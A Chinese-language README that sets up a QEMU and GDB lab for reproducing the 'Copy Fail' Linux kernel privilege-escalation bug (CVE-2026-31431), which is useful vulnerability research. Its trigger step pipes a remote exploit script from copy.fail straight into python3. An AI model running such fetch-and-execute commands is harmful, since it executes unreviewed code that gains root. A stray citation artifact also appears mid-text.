# copyfailRecurrence
# Copy Fail (CVE-2026-31431) 内核漏洞复现环境

> 本项目提供一个完整的 Linux 内核漏洞复现与调试环境，用于复现 Copy Fail（CVE-2026-31431），支持 QEMU + GDB 动态调试。

---

# 📌 漏洞简介

Copy Fail（CVE-2026-31431）是一个 Linux 内核本地提权漏洞：

- 影响范围：Linux 4.14 ~ 6.18 修复前
- 利用方式：普通用户 → root
- 类型：逻辑漏洞（非 race）
- 模块：`algif_aead`（AF_ALG 接口）

---

# 🧠 为什么选择 6.6.1

本项目使用 Linux **6.6.1**：

- ✔ 属于 6.6 LTS 分支
- ✔ 处于漏洞影响范围内
- ✔ patch 最少 → 编译最快
- ✔ 调试路径最干净

Linux 6.6.1 是 6.6 系列早期稳定版本，由官方发布并维护 :contentReference[oaicite:0]{index=0}

---

# 🧰 一、环境要求

推荐：

- Ubuntu 20.04 / 22.04 / 24.04（物理机或虚拟机）
- x86_64 CPU
- 支持 KVM

检查：

```bash
ls /dev/kvm
````

---

# 📦 二、安装依赖

```bash
sudo apt update
sudo apt install -y build-essential flex bison libncurses-dev libssl-dev libelf-dev \
    qemu-system-x86 qemu-utils wget cpio gdb curl
```

---

# 📁 三、工作目录

```bash
mkdir -p ~/copyfail-lab
cd ~/copyfail-lab
```

---

# 📥 四、下载内核源码（双源）

## 🌍 官方源（推荐）

```bash
wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.6.1.tar.xz
```

## 🇨🇳 清华镜像（国内更快）

```bash
wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v6.x/linux-6.6.1.tar.xz
```

---

## 解压

```bash
tar -xf linux-6.6.1.tar.xz
cd linux-6.6.1
```

---

# ⚙️ 五、配置内核

```bash
make defconfig
make menuconfig
```

---

## 必须开启：

| 功能        | 选项                              |
| --------- | ------------------------------- |
| initramfs | `CONFIG_BLK_DEV_INITRD=y`       |
| RAM disk  | `CONFIG_BLK_DEV_RAM=y`          |
| devtmpfs  | `CONFIG_DEVTMPFS=y`             |
| 调试符号      | `CONFIG_DEBUG_INFO=y`           |
| 漏洞模块      | `CONFIG_CRYPTO_USER_API_AEAD=y` |
| 用户接口      | `CONFIG_CRYPTO_USER_API=y`      |

---

## 推荐关闭：

```bash
CONFIG_RANDOMIZE_BASE=n
```

或运行时：

```bash
nokaslr
```

---

# 🔧 六、编译内核

```bash
make olddefconfig
make -j$(nproc)
```

生成：

* `vmlinux`（GDB 使用）
* `bzImage`（QEMU 启动）

---

# 📦 七、构建 rootfs（BusyBox）

## 下载

```bash
cd ~/copyfail-lab
wget https://busybox.net/downloads/busybox-1.37.0.tar.bz2
tar -xf busybox-1.37.0.tar.bz2
cd busybox-1.37.0
make menuconfig
```

开启：

```
Build static binary → [*]
```

---

## 编译

```bash
make -j$(nproc)
make install
```

---

## 初始化 rootfs

```bash
cd _install
mkdir -p proc sys dev etc/init.d
ln -sf bin/busybox init
```

---

## 设备节点

```bash
sudo mknod -m 666 dev/console c 5 1
sudo mknod -m 666 dev/null c 1 3
```

---

## 启动脚本

```bash
cat > etc/init.d/rcS <<'EOF'
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t debugfs none /sys/kernel/debug
echo -e "\n[+] Copy Fail Lab Ready\n"
/bin/sh
EOF

chmod +x etc/init.d/rcS
```

---

## 打包

```bash
cd ..
find ./_install | cpio -o -H newc | gzip > rootfs.cpio.gz
```

---

# 🚀 八、启动 QEMU

## 创建脚本

```bash
cd ~/copyfail-lab/linux-6.6.1
```

```bash
cat > run.sh <<'EOF'
#!/bin/bash

qemu-system-x86_64 \
  -kernel ./arch/x86/boot/bzImage \
  -initrd ../busybox-1.37.0/rootfs.cpio.gz \
  -append "console=ttyS0 nokaslr" \
  -nographic \
  -s -S \
  -enable-kvm
EOF

chmod +x run.sh
```

---

## 启动

```bash
./run.sh
```

---

# 🐛 九、GDB 调试

```bash
gdb vmlinux
```

```gdb
target remote :1234
hbreak _aead_recvmsg
hbreak crypto_authenc_esn_decrypt
continue
```

---

# 🔥 十、触发漏洞

```bash
curl https://copy.fail/exp | python3
```

或：

```bash
wget https://copy.fail/exp -O exp.py
python3 exp.py
```

---

# 🎯 十一、调试重点

关键函数：

* `_aead_recvmsg`
* `crypto_authenc_esn_decrypt`

观察：

* `assoclen`
* `scatterlist`
* `dst buffer`

---

# ❗ 十二、常见问题

## ❌ 无法挂载 rootfs

检查：

```bash
CONFIG_BLK_DEV_RAM
CONFIG_DEVTMPFS
```

---

## ❌ 没有 shell

```bash
init -> busybox
rcS 权限
```

---

## ❌ GDB 无法断点

使用：

```gdb
hbreak
```

---

## ❌ 编译慢

优化：

* 使用 `-j$(nproc)`
* 精简 config
* 关闭 DEBUG_INFO（如不调试）
  
